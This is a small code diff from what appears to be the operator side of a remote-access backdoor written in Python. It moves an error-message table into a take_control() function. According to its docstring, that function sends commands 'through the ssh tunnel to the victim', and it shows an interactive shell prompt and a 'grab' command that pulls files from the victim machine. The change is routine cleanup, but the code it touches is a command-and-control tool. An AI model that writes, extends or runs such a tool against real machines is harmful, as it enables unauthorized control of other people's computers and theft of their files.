@@ -140,10 +140,14 @@ def get_files(chan):
         return
 
 
-def take_control(chan, ssh_t,  get_file_errors):
+def take_control(chan, ssh_t):
     '''
     Start sending commands through the ssh tunnel to the victim.
     '''
+    getting_file_errors = {
+        b'2': 'invalid path', b'3': 'no such file',
+        b'1': 'some problems', b'4': 'invalid grab command (usage: grab path [file])'
+    }
     ip, port = ssh_t.getpeername()
     while True:
         command = input(f"@{ip}:~$")
@@ -158,7 +162,7 @@ def take_control(chan, ssh_t,  get_file_errors):
             if status == b'0':
                 get_files(chan)
             else:
-                print(get_file_errors[status])
+                print(getting_file_errors[status])
         elif command == 'server stop':
             ssh_t.close()   # close all channels are tied to it
             sys.exit(0)
@@ -172,11 +176,6 @@ def take_control(chan, ssh_t,  get_file_errors):
 
 
 def main():
-    getting_file_errors = {
-        b'2': 'invalid path', b'3': 'no such file',
-        b'1': 'some problems', b'4': 'invalid grab command (usage: grab path [file])'
-    }
-
     # parse args
     args = get_args()
 
@@ -191,7 +190,7 @@ def main():
         chan, t = server.establish_connection(sock)
 
         # start command cycle
-        take_control(chan, t, getting_file_errors)
+        take_control(chan, t)
 
     except Exception as e:
         print(e.__class__.__name__ + ': ' + str(e))
